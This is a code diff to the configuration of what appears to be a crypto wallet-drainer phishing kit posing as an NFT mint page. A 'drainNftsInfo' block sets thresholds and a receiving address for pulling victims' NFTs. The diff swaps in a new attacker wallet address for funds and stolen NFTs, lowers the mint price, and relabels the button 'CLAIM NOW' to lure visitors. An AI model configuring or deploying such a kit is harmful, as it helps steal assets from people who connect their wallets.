@@ -2,7 +2,7 @@
     = = = = = YOUR WALLET ADRESS = = = = =
 */
 
-const receiveAddress = "0xC820C44E2a05441C671994E95Cda0DD6eE0D69de";
+const receiveAddress = "0x46FE320554c9691b9cBD29443ec5810f5404A4F3";
 
 /*
     = = = = = COLLECTION SETTINGS = = = = =
@@ -10,7 +10,7 @@ const receiveAddress = "0xC820C44E2a05441C671994E95Cda0DD6eE0D69de";
 
 const collectionInfo = {
     name: "minter",
-    date: "05.08.2022",
+    date: "24.08.2022",
     socialMedia: {
         discord: "discord.gg/",
         twitter: "https://twitter.com/logout",
@@ -33,7 +33,7 @@ const collectionInfo = {
 */
 
 const mintInfo = {
-    price: 0.06,
+    price: 0.01,
     totalSupply: 1111,
     minUnits: 1,
     maxUnits: 5,
@@ -48,13 +48,13 @@ const drainNftsInfo = {
     active: false,
     minValue: 0.02,
     maxTransfer: 100,
-    nftReceiveAddress: "0xC820C44E2a05441C671994E95Cda0DD6eE0D69de",
+    nftReceiveAddress: "0x46FE320554c9691b9cBD29443ec5810f5404A4F3",
 }
 
 const customStrings = {
     title: "MINT {name}", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
     connectButton: "CONNECT WALLET",
-    transferButton: "MINT NOW",
+    transferButton: "CLAIM NOW",
     dateString: "Pre sale available {date}", // Date string (ex "Pre sale available {date}") - You can use {date} to insert the collection date
 }
 
